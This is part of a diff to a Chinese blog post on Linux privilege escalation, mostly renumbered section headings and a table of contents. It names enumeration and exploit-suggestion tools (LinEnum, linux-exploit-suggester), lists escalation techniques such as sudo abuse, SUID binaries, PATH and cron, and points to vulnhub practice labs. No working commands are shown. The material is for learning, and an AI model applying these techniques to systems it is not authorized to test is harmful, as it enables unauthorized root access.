 <h3 id="2-LinEnum"><a href="#2-LinEnum" class="headerlink" title="2.LinEnum"></a>2.LinEnum</h3><p>  <code>LinEnum</code>会服务器内基本提权需要的信息都会枚举出来</p>
 <p>  <a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
 <h3 id="3-linux-exploit-suggester"><a href="#3-linux-exploit-suggester" class="headerlink" title="3.linux-exploit-suggester"></a>3.linux-exploit-suggester</h3><p>  <code>linux-exploit-suggester</code>根据软件版本进行<code>cve</code>漏洞判断，就像一些厂商扫描器判断漏洞那样子。你懂得~</p>
-<h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><p>  上面的提权演示由相当一部分是属于重复类型。比如<code>root</code>权限运行的<code>mysql</code>就属于<code>组件服务</code>和<code>root权限运行程序</code>的提权方式。不过没关系，上面这些演示是为了更了解<code>linux</code>提权方式。</p>
+<h2 id="0x0F-结言"><a href="#0x0F-结言" class="headerlink" title="0x0F 结言"></a>0x0F 结言</h2><p>  上面的提权演示由相当一部分是属于重复类型。比如<code>root</code>权限运行的<code>mysql</code>就属于<code>组件服务</code>和<code>root权限运行程序</code>的提权方式。不过没关系，上面这些演示是为了更了解<code>linux</code>提权方式。</p>
 <p>  推荐一下<code>vulnhub</code>靶机提权练习，如果想自己练习提权可以点击链接自己寻找。</p>
 <p>  <a target="_blank" rel="noopener" href="https://github.com/Ignitetechnologies/Privilege-Escalation">Privilege-Escalation</a></p>
 
@@ -573,7 +573,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Linux 提权杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-%E4%BB%80%E4%B9%88%E6%98%AF%E6%8F%90%E6%9D%83%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 什么是提权？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-Linux%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 Linux权限划分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9D%83%E9%99%90%E6%8A%BD%E8%B1%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.权限抽象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 内核利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 root权限运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E7%BB%84%E4%BB%B6%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 组件服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x7-%E5%BC%B1-%E9%87%8D%E5%A4%8D-%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.7.</span> <span class="toc-text">0x7 弱&#x2F;重复&#x2F;明文密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x8-%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.8.</span> <span class="toc-text">0x8 配置错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x9-%E6%BB%A5%E7%94%A8sudo%E6%9D%83%E9%99%90"><span class="toc-number">1.9.</span> <span class="toc-text">0x9 滥用sudo权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-suid-sgid-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.</span> <span class="toc-text">0x10 suid&#x2F;sgid 可执行文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-root%E8%BF%90%E8%A1%8C%E4%BD%86%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E5%86%99%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">1.11.</span> <span class="toc-text">0x11 root运行但普通用户可写的脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-PATH%E6%8F%90%E6%9D%83"><span class="toc-number">1.12.</span> <span class="toc-text">0x12 PATH提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.13.</span> <span class="toc-text">0x13 定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-nfs"><span class="toc-number">1.14.</span> <span class="toc-text">0x14 nfs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-%E5%B7%A5%E5%85%B7"><span class="toc-number">1.15.</span> <span class="toc-text">0x15 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LinPEAS"><span class="toc-number">1.15.1.</span> <span class="toc-text">1.LinPEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LinEnum"><span class="toc-number">1.15.2.</span> <span class="toc-text">2.LinEnum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-linux-exploit-suggester"><span class="toc-number">1.15.3.</span> <span class="toc-text">3.linux-exploit-suggester</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%A8%80"><span class="toc-number">1.16.</span> <span class="toc-text">结言</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Linux 提权杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AF%E6%8F%90%E6%9D%83%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 什么是提权？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Linux%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 Linux权限划分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9D%83%E9%99%90%E6%8A%BD%E8%B1%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.权限抽象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 内核利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 root权限运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E7%BB%84%E4%BB%B6%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.6.</span> <span class="toc-text">0x05 组件服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%BC%B1-%E9%87%8D%E5%A4%8D-%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.7.</span> <span class="toc-text">0x06 弱&#x2F;重复&#x2F;明文密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.8.</span> <span class="toc-text">0x07 配置错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E6%BB%A5%E7%94%A8sudo%E6%9D%83%E9%99%90"><span class="toc-number">1.9.</span> <span class="toc-text">0x08 滥用sudo权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-suid-sgid-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.</span> <span class="toc-text">0x09 suid&#x2F;sgid 可执行文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-root%E8%BF%90%E8%A1%8C%E4%BD%86%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E5%86%99%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">1.11.</span> <span class="toc-text">0x0A root运行但普通用户可写的脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-PATH%E6%8F%90%E6%9D%83"><span class="toc-number">1.12.</span> <span class="toc-text">0x0B PATH提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.13.</span> <span class="toc-text">0x0C 定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D-nfs"><span class="toc-number">1.14.</span> <span class="toc-text">0x0D nfs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xE-%E5%B7%A5%E5%85%B7"><span class="toc-number">1.15.</span> <span class="toc-text">0xE 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LinPEAS"><span class="toc-number">1.15.1.</span> <span class="toc-text">1.LinPEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LinEnum"><span class="toc-number">1.15.2.</span> <span class="toc-text">2.LinEnum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-linux-exploit-suggester"><span class="toc-number">1.15.3.</span> <span class="toc-text">3.linux-exploit-suggester</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0F-%E7%BB%93%E8%A8%80"><span class="toc-number">1.16.</span> <span class="toc-text">0x0F 结言</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
